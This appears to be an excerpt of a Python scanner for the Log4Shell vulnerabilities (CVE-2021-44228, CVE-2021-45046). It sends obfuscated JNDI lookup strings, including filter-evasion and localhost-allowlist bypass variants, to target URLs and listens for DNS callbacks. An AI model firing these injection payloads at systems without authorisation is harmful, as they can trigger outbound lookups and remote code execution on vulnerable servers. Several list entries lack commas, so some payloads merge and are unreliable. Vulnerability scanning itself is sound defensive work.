...
# coding=utf-8
# ******************************************************************
# Scanner Log4Shell:  Apache LOG4J  -> RCE CVE-2021-44228 and CVE-2021-45046
# Authors:
# Pedro Magalhaes & Jose Goncalves
# AP Connection provided by FullHunt.io 
# IP Telecom.
# ******************************************************************
...
# Remove SSL Warning - Because Redirects and other stupid proxy things ;)
try:
...
cprint('[•] - - - - IP Telecom - - - -  [•]', "blue")
cprint('[•] CVE-2021-44228 and CVE-2021-45046 -> Scanner Log4Shell [•]', "yellow")
cprint('[•] Warning - Internet Connection Needed !!! [•]', "yellow")
cprint('[•] Problems -> Pedro Magalhaes or Jose Carlos [•]', "yellow")
...
bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                       ...
                       "${jndi:dns://{{callback_host}}}", #new v1
                       "${jndi:rmi://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}}" # new v2
                       "${${upper:}jndi:ldap://{{callback_host}}/a}" #added v3 payload 
                       "${${::-j}ndi:rmi://{{callback_host}}/teste1232" #verify v4 "#"
                       ]

cve_2021_45046 = [
                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}", 
                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/a}" #NEW Payload - Local bypass double check
...
def generate_bypass_payloads(callback_host, random_string):
    payloads = []
...
def scan_url(url, callback_host):
    ...
    if args.bypass_payloads:
        payloads.extend(generate_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
    if args.cve_2021_45046:
        cprint(f"[•] Scanning for CVE-2021-45046 (Log4Shell) Bypass - RCE)", "yellow")
...
def main():
    ...
    if args.custom_dns_callback_host:
        ...
        cprint("[•] Important - If you are using IP VPN (Checkpoint) - Bypass Proxy first !!! [•]", "cyan")
        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}). [•]")
        if args.dns_callback_provider == "interact.sh": # IP -> Warning, with VPN we cannot acess to the dns provider !!! ***
    ...
    cprint("[%] Checking for Log4Shell RCE CVE-2021-44228. [•]", "magenta")
    for url in urls:
    ...
    cprint("[•] Sending payloads to all URLS. Waiting for DNS Resquest Info. [•]", "cyan")
    cprint("[•] Waiting... [•]", "cyan")
